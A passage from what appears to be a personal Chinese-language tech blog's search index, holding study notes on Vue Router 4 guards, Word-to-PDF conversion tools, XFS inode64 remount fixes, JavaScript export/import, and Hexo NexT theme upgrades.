API 你可以為路由組件添加以下配置： beforeRouteEnter beforeRouteUpdate beforeRouteLeave const UserDetails = { template: `...`, beforeRouteEnter(to, from) { // 在渲染該組件的對應路由被驗證前調用 // 不能獲取組件實例 `this` ！ // 因為當守衛執行時，組件實例還沒被創建！ }, beforeRouteUpdate(to, from) { // 在當前路由改變，但是該組件被覆用時調用 // 舉例來說，對於一個帶有動態參數的路徑 `/users/:id`，在 `/users/1` 和 `/users/2` 之間跳轉的時候， // 由於會渲染同樣的 `UserDetails` 組件，因此組件實例會被覆用。而這個鉤子就會在這個情況下被調用。 // 因為在這種情況發生的時候，組件已經掛載好了，導航守衛可以訪問組件實例 `this` }, beforeRouteLeave(to, from) { // 在導航離開渲染該組件的對應路由時調用 // 與 `beforeRouteUpdate` 一樣，它可以訪問組件實例 `this` }, } 常用 beforeRouteLeave beforeRouteLeave (to, from) { const answer = window.confirm('Do you really want to leave? you have unsaved changes!') if (!answer) return false } ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:4","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"完整的導航解析流程 導航被觸發。 在失活的組件裡調用 beforeRouteLeave 守衛。 調用全局的 beforeEach 守衛。 在重用的組件裡調用 beforeRouteUpdate 守衛(2.2+)。 在路由配置裡調用 beforeEnter。 解析異步路由組件。 在被激活的組件裡調用 beforeRouteEnter。 調用全局的 beforeResolve 守衛(2.5+)。 導航被確認。 調用全局的 afterEach 鉤子。 觸發 DOM 更新。 調用 beforeRouteEnter 守衛中傳給 next 的回調函數，創建好的組件實例會作為回調函數的參數傳入。 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:5","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"路由元信息 可針對 route 設定 meta 做一些事情判斷 const routes = [ { path: '/posts', component: PostsLayout, children: [ { path: 'new', component: PostsNew, // 只有經過身份驗證的用戶才能創建帖子 meta: { requiresAuth: true } }, { path: ':id', component: PostsDetail // 任何人都可以閱讀文章 meta: { requiresAuth: false } } ] } ] router.beforeEach((to, from) =\u003e { // 而不是去檢查每條路由記錄 // to.matched.some(record =\u003e record.meta.requiresAuth) if (to.meta.requiresAuth \u0026\u0026 !auth.isLoggedIn()) { // 此路由需要授權，請檢查是否已登錄 // 如果沒有，則重定向到登錄頁面 return { path: '/login', // 保存我們所在的位置，以便以後再來 query: { redirect: to.fullPath }, } } }) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:12:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"懶加載 原寫法 import About from './components/About.vue' const routes = [ { path: '/', component: Home }, { name:'about', path: '/about', component: About }, 新寫法 const About = import('./components/About.vue') const routes = [ { path: '/', component: Home }, { name:'about', path: '/about', component: About }, 簡單來說，變動只有第一行。 2021-06-20目前 webpack才能用的樣子，Vite不能樣子 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:13:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"獲取資料(重點) 當初我在想，載入資料不就寫在 create 就好了嗎?後來我發現，不能這樣，所以官方範例都用 $watch 去做監聽參數。 API — Vue.js 有兩個方式 \u003ctemplate\u003e \u003cdiv class=\"post\"\u003e \u003cdiv v-if=\"loading\" class=\"loading\"\u003eLoading...\u003c/div\u003e \u003cdiv v-if=\"error\" class=\"error\"\u003e{{ error }}\u003c/div\u003e \u003cdiv v-if=\"post\" class=\"content\"\u003e \u003ch2\u003e{{ post.title }}\u003c/h2\u003e \u003cp\u003e{{ post.body }}\u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e 方式一 export default { data() { return { loading: false, post: null, error: null, } }, created() { // watch 路由的參數，以便再次獲取數據 this.$watch( () =\u003e this.$route.params, () =\u003e { this.fetchData() }, // 組件創建完後獲取數據， // 此時 data 已經被 observed 了 { immediate: true } ) }, methods: { fetchData() { this.error = this.post = null this.loading = true // replace `getPost` with your data fetching util / API wrapper // 用你的數據獲取 util 或 API 替換 `getPost` getPost(this.$route.params.id, (err, post) =\u003e { this.loading = false if (err) { this.error = err.toString() } else { this.post = post } }) }, }, } 使用 randomuser 參照官方做個簡單範例 GIT: 6995135924b391a6cd9fe3f8564e3aa80051b036 方式二 export default { data() { return { post: null, error: null, } }, beforeRouteEnter(to, from, next) { getPost(to.params.id, (err, post) =\u003e { next(vm =\u003e vm.setData(err, post)) }) }, // 路由改變前，組件就已經渲染完了 // 邏輯稍稍不同 async beforeRouteUpdate(to, from) { // this.post = null // try { // this.post = await getPost(to.params.id) // } catch (error) { // this.error = error.toString() // } getUser(to.params.id, (err, User) =\u003e { this.setData(err,User) }) }, methods: { setData (err, User) { if (err) { this.error = err.toString() } else { this.User = User } } } 官方忘記加了 setData method，回看 v3 版本文件有這個 method GIT: 8b717a40aa0169fcd8a6fb8eaf3500f65119c428 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:14:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"之前有做過類似做處理 Word 文章 php-excel-templator 用範本(template)快速產生Excel方法 | 程式狂想筆記 Word,Excel的相關template套件小記 | 程式狂想筆記 但沒對做轉 PDF 方法 ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:0:0","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":".Net 方案 Create Word (DOCX) or PDF on Docker container from .NET Core Install Microsoft Office In Windows Container | by Jung-Hyun Nam | Dev Genius Microsoft.Office.Interop.Word 我後來想找 Docker 可以用的，但 MS Office 只能用在 Widnow ，但感覺用 MS Office 很難做 Docker 執行，後來發現找 OpenOffice 才找到有直接能用的，gotenberg 真的太棒了。 ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:1:0","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"其他方案 java如何實現word轉PDF？ - 知乎 目前就幾種方法 1、poi + itext。先轉html再繪製，聽說格式有差異。比較複雜，格式兼容差，跨平台。 2、借助openoffice我覺得不要選這個， openoffice 和 ms office 的格式差異挺大的，還不如jacob。 3、jacob + ms office需要借助本地 office ，格式兼容最好，最後的備選方案。 4、docx4j的export pdf組件。我覺得如果是格式不是很複雜的情況，應該用這個比較好（在office開源界，poi第一它\u003e 應該第二），或者是第5項中的其他方案。plutext/docx4j-export-FO 5、aspose等其他組件。 參考一些方案找現成的 ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:2:0","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"convert-document occrp-attic/convert-document: A docker container for LibreOffice and unoconv, used to generate PDF files from office-type documents. 可以使用，但是中文會變亂碼。但有猜是字型的問題，可參考: 解決OpenOffice格式轉換中文亂碼終極解決方案 - IT閱讀 docker pull alephdata/convert-document docker run -p 3000:3000 -ti alephdata/convert-document ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:2:1","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"officeconverter EugenMayer/officeconverter: Convert file formats like docx, xlx to other formats like pdf, png - based on jodconverter and libreoffice 我執行不能使用… 但我有找到相關的 EugenMayer/docker-image-jodconverter: Docker image with jodconverter + libreoffice for document conversion through a REST api docker run --memory 512m --rm -p 8080:8080 eugenmayer/jodconverter:gui docker run --memory 512m --rm -p 8080:8080 eugenmayer/jodconverter:rest 不知是我的電腦太爛??我執行公司複雜 Word 花了一分多鐘… ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:2:2","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"office2pdf microacup/office2pdf: convert office document（word、ppt）to pdf ms office , openoffice Java 範例程式使用。 都有現成的程式，手動測試一下，發現 gradle 不能用(不知道是版本問題??) 試一下改成將compile改成implementation，testCompile改成testImplementation,然後Sync 就能正常行 build.gradle group 'me.meiqiu.test' version '1.0-SNAPSHOT' apply plugin: 'java' sourceCompatibility = 1.8 repositories { mavenLocal() mavenCentral() } dependencies { // OpenOffice依赖的 implementation ( 'org.openoffice:unoil:4.1.2', 'org.openoffice:juh:4.1.2', 'org.openoffice:ridl:4.1.2', 'org.openoffice:jurt:4.1.2', 'org.jodconverter:jodconverter-core:4.2.0', 'org.jodconverter:jodconverter-local:4.2.0' ) // 调用windows office组件的适配器：jaccb.jar等 implementation fileTree(dir:'libs',include:['*.jar']) testImplementation group: 'junit', name: 'junit', version: '4.12' testImplementation group: 'org.slf4j', name: 'slf4j-log4j12', version: '1.7.25' } 記得要做 JACOB is a JAVA-COM Bridge that allows you to call COM Automation components from Java. It uses JNI to make native calls to the COM libraries. JACOB runs on x86 and x64 environments supporting 32 bit and 64 bit JVMs . 需要把jacob-x.xx-x64.dll放到java/bin(与java.exe相同)目录下 ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:2:3","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"SpringBoot使用LibreOffice轉換PDF 程式範例 SpringBoot使用LibreOffice轉換PDF - SegmentFault 思否 ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:2:4","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"gotenberg thecodingmachine/gotenberg: A Docker-powered stateless API for converting HTML, Markdown and Office documents to PDF gotenberg 這個很棒！中文不會亂碼。用 API 就能轉。原本一分鐘可以執行的，這個不到幾秒就出來了。 別的程式也能串接 kaipaysen/gotenberg.client.java: Java Client for Gotenberg thecodingmachine/gotenberg-php-client: PHP client for the Gotenberg API ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:2:5","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"彩蛋 發現作者還有滿有趣專案thecodingmachine/workadventure: A collaborative web application (virtual office) presented as a 16-bit RPG video game 未來有空找個 Word 模板 Generate documents from a Word template with Docx4j on Wildfly blog-tutorials/generate-documents-from-word-templates-with-docx4j-on-wildfly14 at master · rieckpil/blog-tutorials ","date":"2021-06-27","objectID":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/:3:0","tags":["java","php","word"],"title":"Word (docx) 轉 pdf 方法","uri":"/blog/posts/Word-docx-%E8%BD%89-pdf-%E6%96%B9%E6%B3%95/"},{"categories":["Spring Boot"],"content":"最近再找Spring Boot 設定動態網址 突然看到這篇文章 SpringBoot | 番外：使用小技巧合集-阿里云开发者社区 覺得還滿有趣的 放 banner.jpg,banner.png 到 resource/底下 就會啟動時候，就會顯示 但不是每個圖示都適合 建議要有外框包住文字會比較適合 所以能放什麼萌圖是不可能的 稍微測試一下，幾乎一半的圖都不適合 彩蛋: Spring Boot Vue Axios 實現前後端分離的跨域訪問（CORS） - IT Skills 波林 Polin WEI - 資訊工作者的技術手札 ","date":"2021-06-14","objectID":"/blog/posts/Spring-Boot-%E8%A8%AD%E5%AE%9A%E5%95%9F%E5%8B%95%E6%99%82-Banner/:0:0","tags":["java","spring"],"title":"Spring Boot 設定啟動時 Banner","uri":"/blog/posts/Spring-Boot-%E8%A8%AD%E5%AE%9A%E5%95%9F%E5%8B%95%E6%99%82-Banner/"},{"categories":["Linux"],"content":"通常都知道使用空間滿了就放不了檔案 但是很常漏掉 inode 滿了也放不了 系統上檔案數量限制 | 程式狂想筆記 這篇有特別紀錄 最近我專案碰的機器有時候會遇到程式存檔案到某資料(裡面有很多小資料) 最近爬到 1TB 會遇到 no space left on device 但這邊對回我目前使用 300GB 空間應該不太可能 不過這邊跟 SE 提交一下這個 看能不能解決這個問題 簡單來說，預設掛 XFS 都是以 inode32 選用 inode64 就比較不會遇到問題 ","date":"2021-06-14","objectID":"/blog/posts/XFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device/:0:0","tags":["linux","xfs","storage"],"title":"XFS 程式出現 no space left on device","uri":"/blog/posts/XFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device/"},{"categories":["Linux"],"content":"解決方案文獻 [請教 XFS， JFS， UFS， EXT4， reiser 幾個檔案系統的問題 - \u0008摸鱼](https://www.mofish.work/thread/13977 linux - XFS No space left on device - Stack Overflow 指細看一下這篇，好像這篇也不到 1TB There is a bug with xfs_growfs which causes inodes to not be properly distributed across a partition. The solution is to simply remount with the inode64 option. For example, if this was the /dev/vda1, you would do the following: mount -o remount,inode64 /dev/vda1 You can find more information about the bug at the following link: http://xfs.org/index.php/XFS_FAQ#Q:_Why_do_I_receive_No_space_left_on_device_after_xfs_growfs.3F Linux XFS: “no space left on device”_weixin_33737774的博客-CSDN博客 [root@rhn ~]# mount -o remount,inode64 /var/satellite [root@rhn ~]# touch /var/satellite/a [root@rhn ~]# rm -rf /var/satellite/a No space left on device on xfs filesystem with 2.4T _冰冻vs西瓜的技术博客_51CTO博客 查询了下XFS FAQ，发现有一段： Q: What is the inode64 mount option for? By default, with 32bit inodes, XFS places inodes only in the first 1TB of a disk. If you have a disk with 100TB, all inodes will be stuck in the first TB. This can lead to strange things like “disk full” when you still have plenty space free, but there’s no more place in the first TB to create a new inode. Also, performance sucks. To come around this, use the inode64 mount options for filesystems \u003e1TB. Inodes will then be placed in the location where their data is, minimizing disk seeks. Beware that some old programs might have problems reading 64bit inodes, especially over NFS. Your editor used inode64 for over a year with recent (openSUSE 11.1 and higher) distributions using NFS and Samba without any corruptions, so that might be a recent enough distro. 大意就是xfs文件系统会把inode存储在磁盘最开始的这1T空间里，如果这部分空间被完全填满了，那么就会出现磁盘空间不足的错误提示了。 查看mount的man帮助手册，可以看到如下内容： XFS文件系统报No space left on device 如何解决？ - 问答 - 云+社区 - 腾讯云 嘗試重新掛載：mount -o remount -o noatime,nodiratime,inode64,nobarrier /dev/vdc1 /data ext3文件系統使用inode table存儲inode信息，而xfs文件系統使用B+ tree存儲。考慮到性能問題，默認情況下這個B+ tree只會使用前1TB空間，當這1TB空間被寫滿後，就會導致無法寫入inode信息，報No spece left on device錯誤。在mount時，指定inode64即可將這個B+ tree使用的空間擴展到整個文件系統。 Linux超实用逻辑卷缩容与扩容亲自实操！ - 邓红 - 博客园 解决XFS文件系统NFS输出Stale NFS file handle错误 – 月与灯依旧 解決辦法： 1，掛載XFS分區時，記得添加inode64參數。否則會默認使用inode32來掛載。 2，本地目錄通過NFS export時，記得添加fsid=XX參數。 這篇還比較特別，提除另外一個第二解，但我不知道有沒有用。 備份圖 ","date":"2021-06-14","objectID":"/blog/posts/XFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device/:1:0","tags":["linux","xfs","storage"],"title":"XFS 程式出現 no space left on device","uri":"/blog/posts/XFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device/"},{"categories":["Linux"],"content":"不錯文章 逛到不錯文章，特別留紀錄 留紀錄 目录中文件过多导致ls命令卡住 - 简书 遍歷EXT3/4文件系統花這麼長時間和這麼多資源有時被認為是文件系統Bug。但是我個人認為，如果有Bug的話，那只能是遍歷軟件的Bug（比如，find命令、不帶-1和-f標識的ls命令以及各種備份軟件），而不是文件系統的Bug。 作者：Maslino 链接：https://www.jianshu.com/p/353a5dbcd423 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 這邊為什麼會看到很多人用 find 去解決 ls 問題 Linux 支援的檔案系統小評測-liuake-ChinaUnix博客 关于XFS文件系统的一个问题 xfs vs ext4 性能压测对比 - 云+社区 - 腾讯云 可能的空间满报错 如果大家在网上搜索xfs的文章可能会搜到磁盘空间剩余很多，但是却报错空间不足的问题，大意就是xfs文件系统会把inode存储在磁盘最开始的这1T空间里，如果这部分空间被完全填满了，那么就会出现磁盘空间不足的错误提示了。解决办法就是在挂载时，指定 inode64 选项： mount -o remount -o noatime,nodiratime,inode64,nobarrier /dev/sdb1 /backup 这个在内核3.7以后的版本 已经解决了。其实默认defaults 挂载参数是 (rw,noatime,attr2,inode64,sunit=128,swidth=512,noquota) 为什么CENTOS 7.0开始选择XFS作为默认的文件系统？XFS相比ext有什么优点？ - 知乎 linux 文件系统 xfs, ext4 的区别 - 简书 EXT4与XFS文件系统对I/O的影响_BK_sys的博客-CSDN博客 ","date":"2021-06-14","objectID":"/blog/posts/XFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device/:2:0","tags":["linux","xfs","storage"],"title":"XFS 程式出現 no space left on device","uri":"/blog/posts/XFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device/"},{"categories":["JavaScript"],"content":"之前有研究 export 要怎麼使用 不過後來沒特別記筆記 最近碰 Vite 稍微完一下 Vue3 發現有點忘記 export 怎麼用 稍微回顧一下，好險有想起來 完全解析 JavaScript import、export | 卡斯伯 Blog - 前端，沒有極限 還是推薦看大神的文章 我這邊是給自己看的筆記 ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:0:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export default 這個我覺得最容易搞懂 首先，常常看到 js 前面都會寫 import xxx from 'xxx' 這邊注意 export default 吃不到 以下方式 import {fn1,fn2} from 'xxx' 這很重要，這很重要，這很重要，我講三遍(我應該很容易搞混) 下面會做詳細說明 相對我們的.vue檔案 會有一個設定 export default { fn1, fn2 } 這邊你會不會覺得放名子進去沒有做甚麼? 這邊其實用到 可以用另外一隻 js 呼叫 這隻 js 用 import hello from 'xxx' PS:hello.fn1(),hellofn2() 這邊注意 export default 吃不到 以下方式 import {fn1,fn2} from 'xxx' 這很重要，這很重要，這很重要，我講三遍(我應該很容易搞混) 下面會做詳細說明 我寫這篇時候，一直以為可以 ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:1:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export named 這邊會有兩種形式寫法 其實之前看，漏看到這段 看到很多套件沒有寫 export default 好像都是用 export function aaa(){...} 居多 但其實用法比較彈性 ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:2:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export xxx named 這邊 xxx 可以換成 var,const, let, function 就我上面的範例 const getReports = () =\u003e console.log('getReports') export {getRerports} import {getReports} from './fetch.js' ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:2:1","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export 14 JavaScript ES6 - 物件縮寫object shorthand - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 export {} 這邊舉一個範例 //fetch.js var bb = function (){ console.log('hello') } export {bb} //main.js import api from './fetch.js'; // 不能這樣取值 console.log(api) //Uncaught SyntaxError: import not found: default //main.js import {bb} from './fetch.js'; console.log(bb) // bb function ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:2:2","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export {} 跟 export xxx named 重複變數會出錯嗎?(會) 其實到這邊我很好奇，export {} 跟 export xxx named 可以撞會出錯嗎 先說議結論會 // fetch.js const c = {bb } export const d = {bb } export {bb,c,d} // main.js import api from './fetch.js'; console.log(api) // Uncaught SyntaxError: duplicate export name 'd' ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:3:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export named 跟 export default 可共存? 先說結論，可以。(其實他們就是兩個不同用法，後面會說) 我目前嘗試使用 export named 和 export default 不衝突。 上面使用看看就知道 ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:4:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export xxx named 和 export default 可共存?(重點) 先說結論，可以。(其實他們就是兩個不同用法，後面會說) 但 import api from './fetch.js';不是吃到 export named ，是吃export default 是吃export default 是吃export default 因為我以為 export named 也能吃… 因為我覺得很重要，所以講三遍(其實我覺得我會很容易忘掉) //fetch.js const c = {bb } export const d = {bb } export {bb,c} export default { addReport } // main.js import api from './fetch.js'; console.log(api) // api.addReport 拿掉 export default //fetch.js const c = {bb } export const d = {bb } export {bb,c} // main.js import api from './fetch.js'; console.log(api) // Uncaught SyntaxError: import not found: default ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:5:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"import * as named 和 import xxxx (重要) 剛開始我以為 * 是抓 export default import * as named 是抓 export named import xxx 是抓 export default 有找到文獻 ModuleImport import * as fs from \"fs\"; // importing the named exports as an object import Dict from \"dict\"; // importing a default export, same as ever ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:6:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"感想 我覺得 export named 和 export default 是不同的東西，這樣想就比較不會有問題 因為我把export來看，以為他們都是有關連的 實際操作，使用方式也不太一樣(import) 動手做做看就知道了 很多不是教學不說，其實是我自己腦補很多東西QQ MDN文件可以看 export - JavaScript | MDN ","date":"2021-06-14","objectID":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:7:0","tags":["javascript","export"],"title":"JS export 用法筆記","uri":"/blog/posts/JS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["Hexo"],"content":"最近升級到 node 14，遇到 Hexo 各種問題。雖然有升到 Hexo 4.2 來解決問題，不過還是遇到了一些問題，想說不影響畫面輸出就沒什麼關係，但讓我的網頁 404 就必需要解決了。 ","date":"2021-06-14","objectID":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/:0:0","tags":["hexo","next"],"title":"Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 方法","uri":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/"},{"categories":["Hexo"],"content":"問題整理 上下頁數顯示不正常 執行跑出以下錯誤 ","date":"2021-06-14","objectID":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/:1:0","tags":["hexo","next"],"title":"Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 方法","uri":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/"},{"categories":["Hexo"],"content":"解決問題 1 我有找到顯示 Hexo 錯誤方法。 解決 Hexo 在使用 Node.js 14 時的 Accessing non-existent property ‘xxx’ of module exports inside circular dependency 問題 - 好一則博 npx cross-env NODE_OPTIONS=\"--trace-warnings\" hexo s 恩…，看不懂是什麼錯誤跳過 設定 package.json 還是無法排除… 所以先放棄 後來爬了一下文章，是 NexT 舊版本問題造成的。升級上去就能解決。 extra space of menu in default _config.yml cause category unable to jump in menu because of %20 · Issue #1315 · theme-next/hexo-theme-next 就感快升級解決。可以參考hexo-theme-next/UPDATE-FROM-5.1.X.md at master · theme-next/hexo-theme-next 簡單來說，舊版的 Next Theme 不用刪掉，只要clone 新得資料夾，就選定新的資料夾主題，最後用 VScode 比較_config.yml檔案就能做簡單移轉。 太久沒用了，都忘了當出怎麼搞這些畫面 順便回想，當出怎麼設定東西 這邊又遇到奇怪的東西，官方新版首頁也掛掉了… ","date":"2021-06-14","objectID":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/:2:0","tags":["hexo","next"],"title":"Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 方法","uri":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/"},{"categories":["Hexo"],"content":"問題整理 2 出現不正確名稱WTF 剛好網路上看到說找不到語系，預設會是德文 解決方式：在hexo/_config.yml 的 language 設定zh- TW (大小寫要一致) hexo clean hexo s 就能看到畫面正常了 ","date":"2021-06-14","objectID":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/:3:0","tags":["hexo","next"],"title":"Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 